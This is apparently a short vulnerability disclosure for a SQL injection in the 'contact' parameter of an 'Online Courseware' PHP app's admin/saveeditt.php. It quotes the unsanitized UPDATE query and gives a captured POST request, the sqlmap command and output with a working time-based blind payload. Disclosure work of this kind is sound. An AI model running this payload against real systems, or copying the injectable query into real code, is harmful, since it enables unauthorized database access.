#### BUG_AUTHOR:LIU WEIYU
## Online Courseware - SQL Injection on (admin/saveeditt.php contact parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
admin/saveeditt.php 

On this page, contact parameter is vulnerable to SQL Injection Attack 
### Source code(pcci/admin/saveeditt.php):
```
$contact=$_POST['contact'];
mysqli_query($conn,"UPDATE teacher SET fname='$fname', lname='$lname', address='$address', gender='$gender', email='$email', contact='$contact' WHERE id='$id'");
```
### Proof of vulnerability(Verify using the sqlmap tool after logining ):
#### Request:
```
POST /onlinecourseware/pcci/admin/saveeditt.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 213
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=sm0bljsdrcd3r9gqelkfs2sf73
Origin: http://localhost
Referer: http://localhost/onlinecourseware/pcci/admin/teacher.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

address=Bacolod+City&contact=2147483647&email=joshgayanelo%40gmail.com&fname=Josh11&gender=Male&id=1&lname=Gayanelo
```
#### -> sqlmap -r 1.txt (above request package) --batch
### Output:
```
---
Parameter: contact (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: address=Bacolod City&contact=2147483647' AND (SELECT 6393 FROM (SELECT(SLEEP(5)))MPOd) AND 'QgFe'='QgFe&email=joshgayanelo@gmail.com&fname=Josh11&gender=Male&id=1&lname=Gayanelo
---
```
